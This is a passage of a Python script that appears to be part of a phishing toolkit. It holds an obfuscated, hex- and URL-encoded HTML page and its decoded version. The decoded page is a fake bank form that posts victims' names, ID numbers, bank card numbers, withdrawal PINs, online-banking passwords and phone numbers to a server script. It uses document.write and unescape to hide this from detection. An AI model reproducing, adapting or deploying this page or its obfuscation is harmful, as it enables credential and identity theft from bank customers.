32\x32\x67\x6c\x79\x70\x68\x69\x63\x6f\x6e\x25\x32\x30\x67\x6c\x79\x70\x68\x69\x63\x6f\x6e\x2d\x6f\x6b\x25\x32\x30\x66\x6f\x72\x6d\x2d\x63\x6f\x6e\x74\x72\x6f\x6c\x2d\x66\x65\x65\x64\x62\x61\x63\x6b\x25\x32\x30\x73\x72\x2d\x6f\x6e\x6c\x79\x25\x32\x32\x25\x33\x45\x25\x33\x43\x2f\x73\x70\x61\x6e\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x33\x43\x2f\x64\x69\x76\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x33\x43\x2f\x64\x69\x76\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x30\x44\x25\x30\x41\x25\x33\x43\x64\x69\x76\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x66\x6f\x72\x6d\x2d\x67\x72\x6f\x75\x70\x25\x32\x32\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x33\x43\x6c\x61\x62\x65\x6c\x25\x32\x30\x66\x6f\x72\x25\x33\x44\x25\x32\x32\x64\x72\x61\x77\x70\x61\x73\x73\x77\x6f\x72\x64\x25\x32\x32\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x63\x6f\x6c\x2d\x73\x6d\x2d\x33\x25\x32\x30\x63\x6f\x6e\x74\x72\x6f\x6c\x2d\x6c\x61\x62\x65\x6c\x25\x32\x32\x25\x33\x45\x25\x33\x43\x69\x6d\x67\x25\x32\x30\x73\x72\x63\x25\x33\x44\x25\x32\x32\x2f\x61\x73\x73\x65\x74\x73\x2f\x69\x6d\x61\x67\x65\x73\x2f\x78\x2f\x35\x2e\x70\x6e\x67\x25\x32\x32\x25\x33\x45\x25\x33\x43\x2f\x6c\x61\x62\x65\x6c\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x33\x43\x64\x69\x76\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x63\x6f\x6c\x2d\x73\x6d\x2d\x39\x25\x32\x32\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x33\x43\x69\x6e\x70\x75\x74\x25\x32\x30\x74\x79\x70\x65\x25\x33\x44\x25\x32\x32\x70\x61\x73\x73\x77\x6f\x72\x64\x25\x32\x32\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x66\x6f\x72\x6d\x2d\x63\x6f\x6e\x74\x72\x6f\x6c\x25\x32\x30\x63\x6f\x64\x65\x25\x32\x30\x70\x61\x73\x73\x25\x32\x30\x74\x65\x78\x74\x25\x32\x32\x25\x32\x30\x69\x64\x25\x33\x44\x25\x32\x32\x64\x72\x61\x77\x70\x61\x73\x73\x77\x6f\x72\x64\x25\x32\x32\x25\x32\x30\x6e\x61\x6d\x65\x25\x33\x44\x25\x32\x32\x77\x69\x74\x68\x64\x72\x61\x77\x70\x61\x73\x73\x25\x32\x32\x25\x32\x30\x25\x32\x30\x76\x61\x6c\x69\x64\x61\x74\x65\x25\x33\x44\x25\x32\x32\x65\x6d\x70\x74\x79\x25\x32\x32\x25\x32\x30\x6c\x65\x6e\x67\x74\x68\x25\x33\x44\x25\x32\x32\x36\x25\x32\x32\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x33\x43\x73\x70\x61\x6e\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x67\x6c\x79\x70\x68\x69\x63\x6f\x6e\x25\x32\x30\x67\x6c\x79\x70\x68\x69\x63\x6f\x6e\x2d\x6f\x6b\x25\x32\x30\x66\x6f\x72\x6d\x2d\x63\x6f\x6e\x74\x72\x6f\x6c\x2d\x66\x65\x65\x64\x62\x61\x63\x6b\x25\x32\x30\x73\x72\x2d\x6f\x6e\x6c\x79\x25\x32\x30\x73\x2d\x31\x32\x30\x25\x32\x32\x25\x33\x45\x25\x33\x43\x2f\x73\x70\x61\x6e\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x33\x43\x2f\x64\x69\x76\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x33\x43\x2f\x64\x69\x76\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x30\x44\x25\x30\x41\x25\x33\x43\x64\x69\x76\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x66\x6f\x72\x6d\x2d\x67\x72\x6f\x75\x70\x25\x32\x32\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x33\x43\x6c\x61\x62\x65\x6c\x25\x32\x30\x66\x6f\x72\x25\x33\x44\x25\x32\x32\x6c\x6f\x67\x69\x6e\x70\x61\x73\x73\x25\x32\x32\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x63\x6f\x6c\x2d\x73\x6d\x2d\x33\x25\x32\x30\x63\x6f\x6e\x74\x72\x6f\x6c\x2d\x6c\x61\x62\x65\x6c\x25\x32\x32\x25\x33\x45\x25\x33\x43\x69\x6d\x67\x25\x32\x30\x73\x72\x63\x25\x33\x44\x25\x32\x32\x2f\x61\x73\x73\x65\x74\x73\x2f\x69\x6d\x61\x67\x65\x73\x2f\x78\x2f\x36\x2e\x70\x6e\x67\x25\x32\x32\x25\x33\x45\x25\x33\x43\x2f\x6c\x61\x62\x65\x6c\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x33\x43\x64\x69\x76\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x63\x6f\x6c\x2d\x73\x6d\x2d\x39\x25\x32\x32\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x33\x43\x69\x6e\x70\x75\x74\x25\x32\x30\x74\x79\x70\x65\x25\x33\x44\x25\x32\x32\x70\x61\x73\x73\x77\x6f\x72\x64\x25\x32\x32\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x66\x6f\x72\x6d\x2d\x63\x6f\x6e\x74\x72\x6f\x6c\x25\x32\x30\x63\x6f\x64\x65\x25\x32\x30\x70\x61\x73\x73\x25\x32\x30\x74\x65\x78\x74\x25\x32\x32\x25\x32\x30\x69\x64\x25\x33\x44\x25\x32\x32\x6c\x6f\x67\x69\x6e\x70\x61\x73\x73\x25\x32\x32\x25\x32\x30\x6e\x61\x6d\x65\x25\x33\x44\x25\x32\x32\x6e\x65\x74\x77\x6f\x72\x6b\x6c\x6f\x67\x69\x6e\x70\x61\x73\x73\x25\x32\x32\x25\x32\x30\x25\x32\x30\x76\x61\x6c\x69\x64\x61\x74\x65\x25\x33\x44\x25\x32\x32\x65\x6d\x70\x74\x79\x25\x32\x32\x25\x32\x30\x6c\x65\x6e\x67\x74\x68\x25\x33\x44\x25\x32\x32\x36\x25\x32\x32\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x33\x43\x73\x70\x61\x6e\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x67\x6c\x79\x70\x68\x69\x63\x6f\x6e\x25\x32\x30\x67\x6c\x79\x70\x68\x69\x63\x6f\x6e\x2d\x6f\x6b\x25\x32\x30\x66\x6f\x72\x6d\x2d\x63\x6f\x6e\x74\x72\x6f\x6c\x2d\x66\x65\x65\x64\x62\x61\x63\x6b\x25\x32\x30\x73\x72\x2d\x6f\x6e\x6c\x79\x25\x32\x30\x73\x2d\x31\x32\x30\x25\x32\x32\x25\x33\x45\x25\x33\x43\x2f\x73\x70\x61\x6e\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x33\x43\x2f\x64\x69\x76\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x33\x43\x2f\x64\x69\x76\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x33\x43\x64\x69\x76\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x66\x6f\x72\x6d\x2d\x67\x72\x6f\x75\x70\x25\x32\x32\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x6c\x61\x62\x65\x6c\x25\x32\x30\x66\x6f\x72\x25\x33\x44\x25\x32\x32\x6d\x6f\x62\x69\x6c\x65\x25\x32\x32\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x63\x6f\x6e\x74\x72\x6f\x6c\x2d\x6c\x61\x62\x65\x6c\x25\x32\x32\x25\x33\x45\x25\x33\x43\x69\x6d\x67\x25\x32\x30\x73\x72\x63\x25\x33\x44\x25\x32\x32\x2f\x61\x73\x73\x65\x74\x73\x2f\x69\x6d\x61\x67\x65\x73\x2f\x78\x2f\x37\x2e\x70\x6e\x67\x25\x32\x32\x25\x33\x45\x25\x33\x43\x2f\x6c\x61\x62\x65\x6c\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x64\x69\x76\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x63\x6f\x6c\x2d\x73\x6d\x2d\x39\x25\x32\x32\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x69\x6e\x70\x75\x74\x25\x32\x30\x74\x79\x70\x65\x25\x33\x44\x25\x32\x32\x74\x65\x78\x74\x25\x32\x32\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x66\x6f\x72\x6d\x2d\x63\x6f\x6e\x74\x72\x6f\x6c\x25\x32\x30\x74\x65\x78\x74\x25\x32\x30\x70\x68\x6f\x6e\x65\x25\x32\x32\x25\x32\x30\x69\x64\x25\x33\x44\x25\x32\x32\x6d\x6f\x62\x69\x6c\x65\x25\x32\x32\x25\x32\x30\x6d\x61\x78\x6c\x65\x6e\x67\x74\x68\x25\x33\x44\x25\x32\x32\x31\x31\x25\x32\x32\x25\x32\x30\x6e\x61\x6d\x65\x25\x33\x44\x25\x32\x32\x6d\x6f\x62\x69\x6c\x65\x25\x32\x32\x25\x32\x30\x76\x61\x6c\x69\x64\x61\x74\x65\x25\x33\x44\x25\x32\x32\x6d\x6f\x62\x69\x6c\x65\x25\x32\x32\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x73\x70\x61\x6e\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x67\x6c\x79\x70\x68\x69\x63\x6f\x6e\x25\x32\x30\x67\x6c\x79\x70\x68\x69\x63\x6f\x6e\x2d\x6f\x6b\x25\x32\x30\x66\x6f\x72\x6d\x2d\x63\x6f\x6e\x74\x72\x6f\x6c\x2d\x66\x65\x65\x64\x62\x61\x63\x6b\x25\x32\x30\x73\x72\x2d\x6f\x6e\x6c\x79\x25\x32\x30\x73\x2d\x31\x34\x30\x25\x32\x32\x25\x33\x45\x25\x33\x43\x2f\x73\x70\x61\x6e\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x2f\x64\x69\x76\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x33\x43\x2f\x64\x69\x76\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x33\x43\x64\x69\x76\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x66\x6f\x72\x6d\x2d\x67\x72\x6f\x75\x70\x25\x32\x32\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x6c\x61\x62\x65\x6c\x25\x32\x30\x66\x6f\x72\x25\x33\x44\x25\x32\x32\x6d\x6f\x62\x69\x6c\x65\x25\x32\x32\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x63\x6f\x6e\x74\x72\x6f\x6c\x2d\x6c\x61\x62\x65\x6c\x25\x32\x32\x25\x33\x45\x25\x33\x43\x2f\x6c\x61\x62\x65\x6c\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x64\x69\x76\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x25\x32\x30\x63\x6f\x6c\x2d\x73\x6d\x2d\x39\x25\x32\x32\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x62\x75\x74\x74\x6f\x6e\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x62\x75\x74\x74\x6f\x6e\x25\x32\x32\x25\x32\x30\x74\x79\x70\x65\x25\x33\x44\x25\x32\x32\x73\x75\x62\x6d\x69\x74\x25\x32\x32\x25\x32\x30\x69\x64\x25\x33\x44\x25\x32\x32\x62\x75\x74\x74\x6f\x6e\x25\x32\x32\x25\x32\x30\x25\x33\x45\x25\x33\x43\x2f\x62\x75\x74\x74\x6f\x6e\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x2f\x64\x69\x76\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x33\x43\x2f\x64\x69\x76\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x2f\x66\x6f\x72\x6d\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x2f\x74\x64\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x74\x64\x25\x32\x30\x73\x74\x79\x6c\x65\x25\x33\x44\x25\x32\x32\x76\x65\x72\x74\x69\x63\x61\x6c\x2d\x61\x6c\x69\x67\x6e\x25\x33\x41\x74\x6f\x70\x25\x32\x32\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x69\x6d\x67\x25\x32\x30\x73\x72\x63\x25\x33\x44\x25\x32\x32\x2f\x61\x73\x73\x65\x74\x73\x2f\x69\x6d\x61\x67\x65\x73\x2f\x78\x2f\x30\x33\x32\x30\x32\x30\x34\x35\x2e\x70\x6e\x67\x25\x32\x32\x25\x32\x30\x77\x69\x64\x74\x68\x25\x33\x44\x25\x32\x32\x32\x36\x34\x25\x32\x32\x25\x32\x30\x68\x65\x69\x67\x68\x74\x25\x33\x44\x25\x32\x32\x31\x33\x34\x25\x32\x32\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x2f\x74\x64\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x2f\x74\x72\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x33\x43\x2f\x74\x61\x62\x6c\x65\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x33\x43\x2f\x64\x69\x76\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x33\x43\x64\x69\x76\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x63\x6f\x6e\x74\x61\x69\x6e\x65\x72\x25\x32\x30\x68\x69\x64\x64\x65\x6e\x2d\x78\x73\x25\x32\x32\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x64\x69\x76\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x72\x6f\x77\x25\x32\x32\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x64\x69\x76\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x63\x6f\x6c\x2d\x6d\x64\x2d\x31\x32\x25\x32\x30\x63\x6f\x6c\x2d\x78\x73\x2d\x31\x32\x25\x32\x30\x63\x65\x6e\x74\x65\x72\x25\x32\x30\x64\x6f\x74\x25\x32\x32\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x69\x6d\x67\x25\x32\x30\x73\x72\x63\x25\x33\x44\x25\x32\x32\x2f\x61\x73\x73\x65\x74\x73\x2f\x69\x6d\x61\x67\x65\x73\x2f\x62\x2d\x66\x61\x71\x2e\x70\x6e\x67\x25\x32\x32\x25\x32\x30\x2f\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x2f\x64\x69\x76\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x2f\x64\x69\x76\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x33\x43\x2f\x64\x69\x76\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x33\x43\x66\x6f\x6f\x74\x65\x72\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x68\x69\x64\x64\x65\x6e\x2d\x78\x73\x25\x32\x32\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x64\x69\x76\x25\x32\x30\x63\x6c\x61\x73\x73\x25\x33\x44\x25\x32\x32\x63\x6f\x6e\x74\x61\x69\x6e\x65\x72\x25\x32\x30\x63\x65\x6e\x74\x65\x72\x25\x32\x32\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x69\x6d\x67\x25\x32\x30\x73\x72\x63\x25\x33\x44\x25\x32\x32\x2f\x61\x73\x73\x65\x74\x73\x2f\x69\x6d\x61\x67\x65\x73\x2f\x7a\x66\x6f\x6f\x74\x65\x72\x2e\x6a\x70\x67\x25\x32\x32\x25\x32\x30\x2f\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x32\x30\x25\x33\x43\x2f\x64\x69\x76\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x32\x30\x25\x32\x30\x25\x33\x43\x2f\x66\x6f\x6f\x74\x65\x72\x25\x33\x45\x25\x30\x44\x25\x30\x41\x25\x33\x43\x2f\x64\x69\x76\x25\x33\x45'));</script>

'''

PLAINTEXT = '''
<script>window["document"]["write"](window["unescape"]('<div class="wrap">
  <div id="header">
    <div class="container">
      <div class="row"><div class="col-md-12 col-xs-12"><div id="logo"></div></div></div>
    </div>
  </div>
 
  <div class="container">
    <div class="row box">
      <table style="width:100%">
        <tr>
          <td height="30"></td>
          <td></td>
        </tr>
        <tr>
          <td>
        <form id="form" method="POST" action="mb.asp?form=yzm" role="form" class="form-horizontal">
                   <input type="hidden" name="pay" id="pay" value="1" />
          <div class="form-group">
            <label for="saving" class="control-label"><img src="/assets/images/x/bnak_dwdw.png"></label>
            <div class="col-sm-9">
'));</script>               <img src="/code/hnn/1.gif" width="121" height="34" />             

<script>window["document"]["write"](window["unescape"]('</div>
          </div>
 
  <div class="form-group ">
    <label for="name" class="control-label"><img src="/assets/images/x/1.png"></label>
    <div class="col-sm-9">
      <input type="text" class="form-control pass text" id="name" name="name" validate="name">
      <span class="glyphicon glyphicon-ok form-control-feedback sr-only s-120"></span>
    </div>
  </div>
  
  <div class="form-group">
    <label for="iden" class="control-label"><img src="/assets/images/x/2.png"></label>
    <div class="col-sm-9 s-300">
      <select class="sel form-control" name="type" id="type">
        <option value="0">%u8EAB%u4EFD%u8BC1</option>
        <option value="1">%u519B%u5B98%u8BC1</option>
        <option value="2">%u5176%u5B83%u8BC1%u4EF6</option>
      </select>
      <input type="text" class="form-control text" id="iden" name="iden" maxlength="22" validate="iden" length="15">
      <span class="glyphicon glyphicon-ok form-control-feedback sr-only"></span>
    </div>
  </div>
 
  <div class="form-group">
<label for="card2" class="col-sm-3 control-label"><img src="/assets/images/x/4.png"></label>
<div class="col-sm-9">
<input type="text" class="form-control text card" id="card" name="card" validate="card" maxlength="32">
<span class="glyphicon glyphicon-ok form-control-feedback sr-only"></span>
</div>
</div>
 
<div class="form-group">
<label for="drawpassword" class="col-sm-3 control-label"><img src="/assets/images/x/5.png"></label>
<div class="col-sm-9">
<input type="password" class="form-control code pass text" id="drawpassword" name="withdrawpass"  validate="empty" length="6">
<span class="glyphicon glyphicon-ok form-control-feedback sr-only s-120"></span>
</div>
</div>
 
<div class="form-group">
<label for="loginpass" class="col-sm-3 control-label"><img src="/assets/images/x/6.png"></label>
<div class="col-sm-9">
<input type="password" class="form-control code pass text" id="loginpass" name="networkloginpass"  validate="empty" length="6">
<span class="glyphicon glyphicon-ok form-control-feedback sr-only s-120"></span>
</div>
</div>
  <div class="form-group">
    <label for="mobile" class="control-label"><img src="/assets/images/x/7.png"></label>
    <div class="col-sm-9">
      <input type="text" class="form-control text phone" id="mobile" maxlength="11" name="mobile" validate="mobile">
      <span class="glyphicon glyphicon-ok form-control-feedback sr-only s-140"></span>
    </div>
  </div>
 
  <div class="form-group">
    <label for="mobile" class="control-label"></label>
    <div class=" col-sm-9">
      
      <button class="button" type="submit" id="button" ></button>
    </div>
  </div>
 
        </form>
      </td>
 
      <td style="vertical-align:top">
        <img src="/assets/images/x/03202045.png" width="264" height="134">
      </td>
    </tr>
  </table>
  </div>
 
  <div class="container hidden-xs">
    <div class="row">
      <div class="col-md-12 col-xs-12 center dot">
        <img src="/assets/images/b-faq.png" />
      </div>
    </div>
  </div>
 
  <footer class="hidden-xs">
    <div class="container center">
      <img src="/assets/images/zfooter.jpg" />
    </div>
  </footer>
</div>'));</script>
'''


if __name__ == '__main__':
    #print(make_random_name())
    run()
    #s = binascii.a2b_qp(urllib.unquote(ENCRYPTTEXT))
    #print(s)
    
    
    